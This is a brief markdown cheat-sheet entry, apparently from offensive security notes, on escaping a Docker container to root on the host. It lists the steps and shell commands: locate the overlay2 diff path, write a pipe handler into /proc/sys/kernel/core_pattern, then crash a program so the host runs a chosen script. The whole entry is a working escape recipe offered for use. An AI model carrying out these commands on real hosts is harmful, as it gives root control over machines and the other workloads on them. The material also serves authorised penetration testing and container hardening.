# Docker Host Escape via core_pattern

If `/proc/sys/kernel/core_pattern` is writable from inside the container (needs broad privileges) and you have a bind-mounted path visible from the host, point crash-dump handling at a script on that shared path, then crash a process to trigger it as the host.

```bash
mount   # find the overlay2 diff dir backing your container on the host
echo "|<host-visible-path-via-overlay2-diff>/shell.sh" > /proc/sys/kernel/core_pattern
# shell.sh: anything you want executed as the host

gcc poc.c -o poc   # a program that deliberately segfaults
./poc              # crash triggers core_pattern -> host executes shell.sh as root
```
